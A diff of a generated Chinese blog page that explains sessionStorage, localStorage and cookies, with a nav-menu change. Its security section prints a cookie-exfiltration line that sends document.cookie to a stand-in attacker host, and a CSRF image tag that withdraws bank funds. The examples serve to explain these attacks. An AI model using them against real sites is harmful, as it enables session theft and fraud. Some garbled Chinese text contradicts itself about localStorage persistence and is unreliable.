@@ -243,6 +243,17 @@
 
           
           
+          <li>
+            <a href="/archive/">
+              
+              ARCHIVES
+              
+              
+            </a>
+          </li>
+          
+          
+          
           
           
           <li>
@@ -260,17 +271,6 @@
             <a href="/tags/">
               
               TAGS
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/archive/">
-              
-              ARCHIVES
               
               
             </a>
@@ -469,65 +469,48 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1>三种浏览器储存数据的方式</h1>
-<h2 id="一、sessionStorage（会话储存）">一、sessionStorage（会话储存）</h2>
-<p><code>sessionStorage</code> 属性允许你访问一个，对应当前源的 session <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象。它与 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage"><code>localStorage</code></a> 相似，不同之处在于 <code>localStorage</code> 里面存储的数据没有过期时间设置，而存储在 <code>sessionStorage</code> 里面的数据在页面会话结束时会被清除。</p>
-<h3 id="特点："><strong>特点：</strong></h3>
-<ul>
-<li>
-<p>页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。</p>
+        <h1 id="三种浏览器储存数据的方式"><a href="#三种浏览器储存数据的方式" class="headerlink" title="三种浏览器储存数据的方式"></a>三种浏览器储存数据的方式</h1><h2 id="一、sessionStorage（会话储存）"><a href="#一、sessionStorage（会话储存）" class="headerlink" title="一、sessionStorage（会话储存）"></a>一、sessionStorage（会话储存）</h2><p><code>sessionStorage</code> 属性允许你访问一个，对应当前源的 session <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象。它与 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage"><code>localStorage</code></a> 相似，不同之处在于 <code>localStorage</code> 里面存储的数据没有过期时间设置，而存储在 <code>sessionStorage</code> 里面的数据在页面会话结束时会被清除。</p>
+<h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a><strong>特点：</strong></h3><ul>
+<li><p>页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。</p>
 </li>
-<li>
-<p>**在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文，**这点和 session cookies 的运行方式不同。</p>
+<li><p><strong>在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文，</strong>这点和 session cookies 的运行方式不同。</p>
 </li>
-<li>
-<p>打开多个相同的 URL 的 Tabs 页面，会创建各自的 <code>sessionStorage</code>。</p>
+<li><p>打开多个相同的 URL 的 Tabs 页面，会创建各自的 <code>sessionStorage</code>。</p>
 </li>
-<li>
-<p>关闭对应浏览器标签或窗口，会清除对应的 <code>sessionStorage</code>。</p>
+<li><p>关闭对应浏览器标签或窗口，会清除对应的 <code>sessionStorage</code>。 </p>
 <p>关键一点：sessionStorage的储存取决于特定的页面协议，即：https和http之间储存的数据是互不形同的</p>
 </li>
 </ul>
-<h3 id="储存形式："><strong>储存形式</strong>：</h3>
-<p>被存储的键值对总是以 UTF-16 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString">DOMString</a> 的格式所存储，其使用两个字节来表示一个字符。对于对象、整数 key 值会自动转换成字符串形式。</p>
+<h3 id="储存形式："><a href="#储存形式：" class="headerlink" title="储存形式："></a><strong>储存形式</strong>：</h3><p>被存储的键值对总是以 UTF-16 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/DOMString">DOMString</a> 的格式所存储，其使用两个字节来表示一个字符。对于对象、整数 key 值会自动转换成字符串形式。</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  语法</span></span><br><span class="line"><span class="comment">// 保存数据到 sessionStorage</span></span><br><span class="line">sessionStorage.setItem(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 获取数据</span></span><br><span class="line"><span class="keyword">let</span> data = sessionStorage.getItem(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 删除保存的数据</span></span><br><span class="line">sessionStorage.removeItem(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 删除所有保存的数据</span></span><br><span class="line">sessionStorage.clear();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>返回值：一个storage对象</p>
-<h2 id="二、localStorage（页面会话储存）">二、localStorage（页面会话储存）</h2>
-<p>存储的数据将 保存在浏览器会话中。说，当页面被关闭时，存储在的数据会被清除。</p>
-<h3 id="储存形式：-2"><strong>储存形式</strong>：</h3>
-<p>另外，<code>localStorage</code>中的值总是对以字符串的形式存储。（需要注意，和js对象相比，自动键值对总是以字符串的形式存储值含义类型会返回为字符串类型）。</p>
+<h2 id="二、localStorage（页面会话储存）"><a href="#二、localStorage（页面会话储存）" class="headerlink" title="二、localStorage（页面会话储存）"></a>二、localStorage（页面会话储存）</h2><p>存储的数据将 保存在浏览器会话中。说，当页面被关闭时，存储在的数据会被清除。</p>
+<h3 id="储存形式：-1"><a href="#储存形式：-1" class="headerlink" title="储存形式："></a><strong>储存形式</strong>：</h3><p>另外，<code>localStorage</code>中的值总是对以字符串的形式存储。（需要注意，和js对象相比，自动键值对总是以字符串的形式存储值含义类型会返回为字符串类型）。</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//语法</span></span><br><span class="line">myStorage = <span class="built_in">localStorage</span>;</span><br><span class="line"><span class="comment">// 增加数据项目</span></span><br><span class="line">一个可被访问用于当前源（origin）的本地存储空间的Storage对象。</span><br><span class="line"><span class="comment">// 该语法阅读localStorage项</span></span><br><span class="line"><span class="keyword">let</span> cat = <span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;myCat&#x27;</span>);</span><br><span class="line"><span class="comment">//该语法用于移除localStorage项</span></span><br><span class="line"><span class="built_in">localStorage</span>.removeItem(<span class="string">&#x27;myCat&#x27;</span>);</span><br><span class="line"><span class="comment">// 移除所有</span></span><br><span class="line"><span class="built_in">localStorage</span>.clear();</span><br></pre></td></tr></table></figure>
 <p><strong>返回的值</strong>：一个可被访问用于当前源（origin）的本地存储空间的<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a>对象。</p>
-<h2 id="session-和-local区别：">session 和 local区别：</h2>
-<p>local的生命周期是永久的。</p>
+<h2 id="session-和-local区别："><a href="#session-和-local区别：" class="headerlink" title="session 和 local区别："></a>session 和 local区别：</h2><p>local的生命周期是永久的。</p>
 <p>session储存的数据有过期时间限制，即就是在浏览器的窗口被关闭的时候就会被清除，而localStorage则是永久储存的，除非用户用户自己在浏览器的UI上进行清除</p>
 <p>不同浏览器无法共享localStorage或sessionStorage中的信息。相同浏览器的不同页面间可以共享相同的 localStorage（页面属于相同域名和端口），但是不同页面或标签页间无法共享sessionStorage的信息。这里需要注意的是，页面及标 签页仅指顶级窗口，如果一个标签页包含多个iframe标签且他们属于同源页面，那么他们之间是可以共享sessionStorage的。</p>
-<h2 id="三、cookie（浏览器的小请求）">三、cookie（浏览器的小请求）</h2>
-<p>Cookies 主要用于三个目的：</p>
+<h2 id="三、cookie（浏览器的小请求）"><a href="#三、cookie（浏览器的小请求）" class="headerlink" title="三、cookie（浏览器的小请求）"></a>三、cookie（浏览器的小请求）</h2><p>Cookies 主要用于三个目的：</p>
 <ul>
-<li>
-<p>会话管理</p>
+<li><p>会话管理</p>
 <p>会员注册、购物、游戏分数，或任何其他服务器应该记住的信息</p>
 </li>
-<li>
-<p>个人化</p>
+<li><p>个人化</p>
 <p>用户设置、布景主题，以及其他设置</p>
 </li>
-<li>
-<p>追踪</p>
+<li><p>追踪</p>
 <p>记录并分析行为用户</p>
 <p>cookie一般随http请求同源携带，数据不能超过4k</p>
 </li>
 </ul>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用 JavaScript 创建Cookie</span></span><br><span class="line"><span class="comment">//JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//JavaScript 中，创建 cookie 如下所示：</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;username=John Doe&quot;</span>;</span><br><span class="line"><span class="comment">//您还可以为 cookie 添加一个过期时间（以 UTC 或 GMT 时间）。默认情况下，cookie 在浏览器关闭时删除：</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT&quot;</span>;</span><br><span class="line"><span class="comment">//您可以使用 path 参数告诉浏览器 cookie 的路径。默认情况下，cookie 属于当前页面。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.cookie=<span class="string">&quot;username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/&quot;</span>;</span><br><span class="line"><span class="comment">//使用 JavaScript 读取 Cookie</span></span><br><span class="line"><span class="comment">//在 JavaScript 中, 可以使用以下代码来读取 cookie：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
 <p><strong>安全问题</strong></p>
-<h3 id="会话劫持以及-XSS"><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Cookies#session_hijacking_%E4%BB%A5%E5%8F%8A_xss">会话劫持以及 XSS</a></h3>
-<p>Cookies 用于应用程序中的身份验证会话，因此应用程序中的应用程序 cookie 可能会造成用户的身份验证会话被<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting">劫持</a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting">。en-US)</a>漏洞。</p>
+<h3 id="会话劫持以及-XSS"><a href="#会话劫持以及-XSS" class="headerlink" title="会话劫持以及 XSS"></a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Cookies#session_hijacking_以及_xss">会话劫持以及 XSS</a></h3><p>Cookies 用于应用程序中的身份验证会话，因此应用程序中的应用程序 cookie 可能会造成用户的身份验证会话被<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting">劫持</a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting">。en-US)</a>漏洞。</p>
 <figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
 <p>复制到剪贴板</p>
 <p>Cookie 中的<code>HttpOnly</code>属性，能够借助阻止通过 JavaScript 取得 cookie 的内容，来减少这种类型的攻击。</p>
-<h3 id="跨站请求伪造-CSRF"><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Cookies#cross-site_request_forgery_(csrf)">跨站请求伪造 (CSRF)</a></h3>
-<p>假设在一个未经允许的或论坛中，插入了一个不是真实的图片，而是对你的银行服务器领钱的形象：</p>
+<h3 id="跨站请求伪造-CSRF"><a href="#跨站请求伪造-CSRF" class="headerlink" title="跨站请求伪造 (CSRF))"></a><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Cookies#cross-site_request_forgery_(csrf">跨站请求伪造 (CSRF)</a>)</h3><p>假设在一个未经允许的或论坛中，插入了一个不是真实的图片，而是对你的银行服务器领钱的形象：</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob<span class="variable">&amp;amount</span>=<span class="number">1000000</span><span class="variable">&amp;for</span>=mallory&quot;&gt;</span></span><br></pre></td></tr></table></figure>
 <p>复制到剪贴板</p>
 <p>现在你的银行账户登入状态中，你的 cookie 仍然有效，并且没有其他的验证方式，当你载入这张图片的 HTML 时，你的钱即不会被转出。发生情况的技术：</p>
@@ -690,7 +673,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">三种浏览器储存数据的方式</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%B8%80%E3%80%81sessionStorage%EF%BC%88%E4%BC%9A%E8%AF%9D%E5%82%A8%E5%AD%98%EF%BC%89"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">一、sessionStorage（会话储存）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">特点：</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%82%A8%E5%AD%98%E5%BD%A2%E5%BC%8F%EF%BC%9A"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">储存形式：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%BA%8C%E3%80%81localStorage%EF%BC%88%E9%A1%B5%E9%9D%A2%E4%BC%9A%E8%AF%9D%E5%82%A8%E5%AD%98%EF%BC%89"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">二、localStorage（页面会话储存）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%82%A8%E5%AD%98%E5%BD%A2%E5%BC%8F%EF%BC%9A-2"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">储存形式：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#session-%E5%92%8C-local%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">session 和 local区别：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%B8%89%E3%80%81cookie%EF%BC%88%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%B0%8F%E8%AF%B7%E6%B1%82%EF%BC%89"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">三、cookie（浏览器的小请求）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E4%BB%A5%E5%8F%8A-XSS"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">会话劫持以及 XSS</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-CSRF"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">跨站请求伪造 (CSRF)</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E4%B8%89%E7%A7%8D%E6%B5%8F%E8%A7%88%E5%99%A8%E5%82%A8%E5%AD%98%E6%95%B0%E6%8D%AE%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">三种浏览器储存数据的方式</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%B8%80%E3%80%81sessionStorage%EF%BC%88%E4%BC%9A%E8%AF%9D%E5%82%A8%E5%AD%98%EF%BC%89"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">一、sessionStorage（会话储存）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">特点：</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%82%A8%E5%AD%98%E5%BD%A2%E5%BC%8F%EF%BC%9A"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">储存形式：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%BA%8C%E3%80%81localStorage%EF%BC%88%E9%A1%B5%E9%9D%A2%E4%BC%9A%E8%AF%9D%E5%82%A8%E5%AD%98%EF%BC%89"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">二、localStorage（页面会话储存）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%82%A8%E5%AD%98%E5%BD%A2%E5%BC%8F%EF%BC%9A-1"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">储存形式：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#session-%E5%92%8C-local%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">session 和 local区别：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%B8%89%E3%80%81cookie%EF%BC%88%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%B0%8F%E8%AF%B7%E6%B1%82%EF%BC%89"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">三、cookie（浏览器的小请求）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81%E4%BB%A5%E5%8F%8A-XSS"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">会话劫持以及 XSS</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-CSRF"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">跨站请求伪造 (CSRF))</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
